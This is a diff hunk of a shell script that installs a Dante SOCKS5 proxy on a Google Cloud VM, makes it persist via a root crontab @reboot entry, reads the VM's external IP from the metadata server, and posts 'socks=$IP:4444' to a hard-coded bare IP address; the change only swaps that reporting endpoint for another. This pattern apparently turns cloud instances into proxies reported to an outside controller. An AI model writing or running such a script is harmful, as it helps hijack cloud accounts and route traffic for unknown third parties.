@@ -47,5 +47,5 @@ sudo crontab -l | { cat; echo '@reboot /etc/sockd.sh'; } | crontab -
 sudo /usr/local/sbin/sockd -D -N 2 -f /etc/danted.conf
 IP=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip" -H "Metadata-Flavor: Google")
 tail /var/log/syslog
-curl -X POST -d "socks=$IP:4444" "http://35.229.33.186/install.php"
+curl -X POST -d "socks=$IP:4444" "http://178.128.4.242/test.php"
 echo "your socks5 is: $IP:$sport"
